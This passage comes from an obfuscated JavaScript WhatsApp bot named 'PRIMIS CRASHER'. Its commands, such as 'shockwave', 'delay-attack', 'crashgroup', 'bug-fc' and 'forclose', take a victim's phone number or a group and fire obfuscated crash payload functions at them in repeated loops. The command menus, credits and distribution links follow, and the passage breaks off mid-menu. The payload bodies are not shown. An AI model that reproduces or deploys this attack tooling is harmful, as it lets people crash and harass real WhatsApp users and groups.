            await _0x3561c4(target, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x162a6a(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x44bef6(target, ptcp = true);
            await _0x44bef6(target, ptcp = true);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
          }
        }
        break;
      case 'shockwave':
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x3ce697 = 0x0; _0x3ce697 < 0xa; _0x3ce697++) {
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x5c64a0(target, ptcp = true);
            await _0x5c64a0(target, ptcp = true);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x4131a6(target);
            await _0x4131a6(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x162a6a(target);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x162a6a(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x162a6a(target);
            await _0x52600c(target, Ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x2ebc96(target, _0x247242, Ptcp = true);
            await _0x399639(target);
            await _0xd2ecf2(target, Ptcp = false);
            await _0x29974a(target);
            await _0x29974a(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x358d0f(target);
            await _0x3def04(target);
            await _0x10574c(target);
          }
        }
        break;
      case "delay-attack":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x417511 = 0x0; _0x417511 < 0xa; _0x417511++) {
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0xb0a89(target);
            await _0x27aa51(target);
            await _0x28a9fc(target, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x358d0f(target);
            await _0x4131a6(target);
          }
        }
        break;
      case '👾':
      case "🕊️":
      case '♣️':
      case "🇭🇹":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x4e51fb) {
            return _0x1fbef7(mess.group);
          }
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x350fc9 = 0x0; _0x350fc9 < 0xf; _0x350fc9++) {
            await _0x3def04(_0x51e776.chat);
            await _0x10574c(_0x51e776.chat);
            await _0x21ee34(_0x51e776.chat);
            await _0x29974a(_0x51e776.chat);
            await _0x29974a(_0x51e776.chat);
          }
        }
        break;
      case "buggc":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x2f533f) {
            return _0x1fbef7("*ᴛʜɪs ғᴇᴀᴛᴜʀᴇ ᴏɴʟʏ sᴇɴᴅ ʙʏ ʙᴏᴛ ɴᴜᴍʙᴇʀ*");
          }
          if (!_0x4e51fb) {
            return _0x1fbef7(mess.group);
          }
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x2fc368 = 0x0; _0x2fc368 < 0xf; _0x2fc368++) {
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0xb0a89(target);
            await _0x27aa51(target);
            await _0x28a9fc(target, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x358d0f(target);
            await _0x4131a6(target);
          }
        }
        break;
      case "prim-attack":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x2f533f) {
            return _0x1fbef7("*ᴛʜɪs ғᴇᴀᴛᴜʀᴇ ᴏɴʟʏ sᴇɴᴅ ʙʏ ʙᴏᴛ ɴᴜᴍʙᴇʀ*");
          }
          if (!_0x4e51fb) {
            return _0x1fbef7(mess.group);
          }
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x22785d = 0x0; _0x22785d < 0xf; _0x22785d++) {
            await _0x3def04(target);
            await _0x10574c(target);
            await _0x29974a(target);
            await _0xb0a89(target);
            await _0x27aa51(target);
            await _0x28a9fc(target, Ptcp = true);
            await _0x21ee34(target, ptcp = false);
            await _0x21ee34(target, ptcp = false);
            await _0x358d0f(target);
            await _0x4131a6(target);
          }
        }
        break;
      case "crashgroup":
      case "offgc":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x2f533f) {
            return _0x1fbef7("*ᴛʜɪs ғᴇᴀᴛᴜʀᴇ ᴏɴʟʏ sᴇɴᴅ ʙʏ ʙᴏᴛ ɴᴜᴍʙᴇʀ*");
          }
          if (!_0x4e51fb) {
            return _0x1fbef7(mess.group);
          }
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x5651a0 = 0x0; _0x5651a0 < 0xf; _0x5651a0++) {
            await _0x3a0067(target);
            await _0x3a0067(target);
            await _0x598ae1(0x5dc);
          }
        }
        break;
      case "bug-fc":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x25f0e3 = 0x0; _0x25f0e3 < 0x19; _0x25f0e3++) {
            await _0x127b29(target, Ptcp = true);
            await _0x598ae1(0x7d0);
            await _0x164203(target, Ptcp = true);
          }
        }
        break;
      case "surge":
      case 'pulse':
      case "rift":
      case 'breaker':
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!_0x2f533f) {
            return _0x1fbef7("*ᴛʜɪs ғᴇᴀᴛᴜʀᴇ ᴏɴʟʏ sᴇɴᴅ ʙʏ ʙᴏᴛ ɴᴜᴍʙᴇʀ*");
          }
          if (!_0x4e51fb) {
            return _0x1fbef7(mess.group);
          }
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          for (let _0x2ac085 = 0x0; _0x2ac085 < 0xf; _0x2ac085++) {
            await _0x3def04(_0x51e776.chat);
            await _0x10574c(_0x51e776.chat);
            await _0x21ee34(_0x51e776.chat);
            await _0x29974a(_0x51e776.chat);
            await _0x29974a(_0x51e776.chat);
          }
        }
        break;
      case "primis-visble":
      case "primis-visble1":
      case "primis-visble2":
      case 'primis-visble3':
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          await _0x2577f3(target);
          await _0x2577f3(target);
          await _0x1c6497(target);
        }
        break;
      case 'crash-blank':
      case "crash-blankui":
      case 'crash-blank2':
      case "crash-hardblank":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          await _0x26cf84(target);
          await kouta(target);
          await _0x4477b5(target);
        }
        break;
      case 'zephyr-forclose':
      case 'james-home':
      case 'trash-forclose':
      case 'alann-forclose':
      case "ds-primis":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          await _0x3f1e6c(target);
          await _0x1c71cc(target);
          await _0x1c6497(target);
          await _0x3f1e6c(target);
        }
        break;
      case 'invis':
      case "super":
      case "home":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + '@s.whatsapp.net';
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          await _0x4477b5(target);
          await _0x559f52(target);
          await kouta(target);
          await _0x1c6497(target);
        }
        break;
      case "ds-combo":
      case 'ds-blank':
      case "ds-forclose":
      case "ds-delay":
        {
          if (!_0x50bf30) {
            return _0x1fbef7(mess.premium);
          }
          if (!q) {
            return _0x1fbef7("`Example:` : " + (_0x177dd4 + _0x54dd8f) + " 50941xxxxxxxx");
          }
          target = q.replace(/[^0-9]/g, '') + "@s.whatsapp.net";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '✅',
              'key': _0x51e776.key
            }
          });
          _0x1fbef7("`𝐒𝐔𝐂𝐂𝐄𝐒 𝐊𝐈𝐋𝐋𝐄𝐃 ☠️`\n\n> *© ᴘᴏᴡᴇʀᴇᴅ ʙʏ ᴅs ᴘʀɪᴍɪs*");
          await _0x559f52(target);
          await _0x559f52(target);
        }
        break;
      case "public":
        {
          if (!_0xe3a414) {
            return _0x1fbef7(mess.owner);
          }
          if (_0x35a9de["public"] === true) {
            return _0x1fbef7("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
          }
          _0x35a9de["public"] = true;
          _0x1fbef7(mess.succes);
        }
        break;
      case "self":
        {
          if (!_0xe3a414) {
            return _0x1fbef7(mess.owner);
          }
          if (_0x35a9de['public'] === false) {
            return _0x1fbef7("`𝖲𝗎𝖼𝖼𝖾𝗌s ☠️`");
          }
          _0x35a9de["public"] = false;
          _0x1fbef7(mess.succes);
        }
        break;
      case 'menu':
      case "prim":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x58652a = "\nʜɪ 👋, *" + _0x28aff1 + "!* ᴡᴇʟᴏᴍᴇ ᴛᴏ ᴘʀɪᴍɪs ᴄʀᴀsʜᴇʀ ᴠ5\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *MENU*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐏𝐑𝐈𝐌𝐈𝐒 𝐂𝐑𝐀𝐂𝐇𝐄𝐑 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "all-menu*\n> ┃🐉│ ➤ *" + _0x177dd4 + "owner-menu*\n> ┃🐉│ ➤ *" + _0x177dd4 + "other-menu*\n> ┃🐉│ ➤ *" + _0x177dd4 + "bug-menu*\n> ┃🐉│ ➤ *" + _0x177dd4 + "bug-menu2*\n> ┃🐉│ ➤ *" + _0x177dd4 + "other-bug*\n> ┃🐉│ ➤ *" + _0x177dd4 + "tqto*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': 'https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg'
            },
            'caption': _0x58652a
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "owner-menu":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x128533 = "\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *OWNER-MENU*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐎𝐖𝐍𝐄𝐑 𝐌𝐄𝐍𝐔 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "addprem*\n> ┃🐉│ ➤ *" + _0x177dd4 + "delprem*\n> ┃🐉│ ➤ *" + _0x177dd4 + "public*\n> ┃🐉│ ➤ *" + _0x177dd4 + "self*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': _0x128533
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "other-menu":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x579dea = "\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *OTHER-MENU*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐎𝐓𝐇𝐄𝐑 𝐌𝐄𝐍𝐔 🐉 ━━┓*\n> ┃🐉│ ➤ *" + _0x177dd4 + "dev*\n> ┃🐉│ ➤ *" + _0x177dd4 + "ping*\n> ┃🐉│ ➤ *" + _0x177dd4 + "script*\n> ┃🐉│ ➤ *" + _0x177dd4 + "tagall*\n> ┃🐉│ ➤ *" + _0x177dd4 + "left*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': _0x579dea
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "tqto":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          const _0x163fc5 = "\n\n*┏━━ 🐉 𝐈𝐍𝐅𝐎 𝐁𝐎𝐓 🐉 ━━┓*\n> ┃🐉│ ʙᴏᴛ ɴᴀᴍᴇ: *PRIMIS CRASHER*\n> ┃🐉│ ᴠᴇʀsɪᴏɴ: *5.0.0*\n> ┃🐉│ ᴅᴇᴠᴇʟᴏᴘᴇʀ: *DS PRIMIS*\n> ┃🐉│ ᴘʀᴇғɪx: *" + _0x177dd4 + "*\n> ┃🐉│ ᴛʏᴘᴇ: *TQTO*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n*┏━━ 🐉 𝐓𝐇𝐀𝐍𝐊𝐒 𝐓𝐎 🐉 ━━┓*\n> ┃🐉│ ➤ *Ds Primis (Creator)*\n> ┃🐉│ ➤ *Zephyr (Collaborator)*\n> ┃🐉│ ➤ *James Dev (Collaborator)*\n> ┃🐉│ ➤ *Alann Xd (Collaborator)*\n> ┃🐉│ ➤ *Trashcore (Friend)*\n> ┃🐉│ ➤ *Ninjaxx (Friend)*\n> ┃🐉│ ➤ *Diana (Friend)*\n> ┃🐉│ ➤ *Mr Smile (Editor)*\n> ┃🐉│ ➤ *SK7 (My Clan)*\n> ┃🐉│ ➤ *T.M.K (My Team)*\n> ┃🐉│ ➤ *Dev Center (My Team)*\n> ┃🐉│ ➤ *Dev Lounge (My Team)*\n> ┃🐉│ ➤ *Team Explore (My Team)*\n> ┃🐉│ ➤ *404 Devs Found (My Team)*\n> ┗━━━━━━━━━━━━━━━━━━━━━━┛\n\n> © *Powered By Ds Primis*\n";
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://files.catbox.moe/p51a1o.jpg"
            },
            'caption': _0x163fc5
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync('./media/primis.mp3'),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "script":
      case 'sc':
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://i.postimg.cc/28g2ZHDw/IMG-20250825-172644-893.jpg"
            },
            'caption': "\n*🐉🐉🐉 Need the bot file? Don’t worry!*  \nYou can easily find it through our official channels 🐉. Everything is well organized so you can access the file quickly, with no fake or broken links 🐉.\n\n📌 Here’s where to get it:\n\n🔗 *WhatsApp Channels:*  \n• https://whatsapp.com/channel/0029VbAqjwm1CYoTLEg7KR44  \n• https://whatsapp.com/channel/0029VbB2Xry0LKZAuosqRO0k\n\n👥 *WhatsApp Group:*  \n• https://chat.whatsapp.com/GXz8wtDTxBp7Y2h0MXNahO?mode=ems_copy_c\n\n📣 *Telegram Channel:*  \n• https://t.me/nova_crash\n\n💬 *Telegram Group:*  \n• https://t.me/nova_crash_group\n\n⏳ *Stay patient and connected,* the official version is coming soon… and it’s going to be 🔥!  \nThanks for your support 🐉.\n\n> *Powered By Ds Primis*\n"
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "dev":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'image': {
              'url': "https://files.catbox.moe/lfqlf4.jpg"
            },
            'caption': "\n╔═════ ∘◦ ✧ ◦∘ ═════╗\n👨‍💻 ᴅs ᴘʀɪᴍɪs – ғᴜʟʟsᴛᴀᴄᴋ\n╚═════ ∘◦ ✧ ◦∘ ═════╝\n\n> 🧠 *sᴋɪʟʟᴇᴅ ɪɴ :*\n⚙️ *ᴊᴀᴠᴀsᴄʀɪᴘᴛ | ɴᴏᴅᴇ.ᴊs | ʀᴇᴀᴄᴛ | ᴍᴏɴɢᴏᴅʙ*\n📱 *ʙᴏᴛ ᴅᴇᴠ (ᴡʜᴀᴛsᴀᴘᴘ | ɢɪᴛʜᴜʙ)*\n🌐 *ᴀᴘɪ ɪɴᴛᴇ́ɢʀᴀᴛɪᴏɴ & ᴀᴜᴛᴏᴍᴀᴛɪᴏɴ*\n\n🛠️ *ᴘᴀssɪᴏɴᴀᴛᴇ ᴀʙᴏᴜᴛ ʙᴜɪʟᴅɪɴɢ ᴄʟᴇᴀɴ, ғᴀsᴛ ᴀɴᴅ sᴄᴀʟᴀʙʟᴇ sʏsᴛᴇᴍs*\n🧩 *ᴀʟᴡᴀʏs ᴘᴜsʜɪɴɢ ʟɪᴍɪᴛs – ᴄᴏᴅᴇ ɪs ɴᴏᴛ ᴊᴜsᴛ sʏɴᴛᴀx, ɪᴛ's ᴀʀᴛ.*\n\n📲 *ғᴏʟʟᴏᴡ ᴍʏ ᴄʜᴀɴɴᴇʟ ᴡʜᴀᴛsᴀᴘᴘ* :\n🔗 https://whatsapp.com/channel/0029VbAqjwm1CYoTLEg7KR44\n☎️ ᴄᴏɴᴛᴀᴄᴛ ᴍᴇ\n🔗 https://t.me/dsprimis\n\n> © *Powered By Ds Primis*\n"
          }, {
            'quoted': _0x51e776
          });
          _0x35a9de.sendMessage(_0x51e776.chat, {
            'audio': fs.readFileSync("./media/primis.mp3"),
            'mimetype': "audio/mpeg",
            'ptt': true
          }, {
            'quoted': _0x51e776
          });
        }
        break;
      case "bug-menu":
        {
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '⏳',
              'key': _0x51e776.key
            }
          });
          await _0x35a9de.sendMessage(_0x51e776.chat, {
            'react': {
              'text': '☠️',
              'key': _0x51e776.key
            }
          });
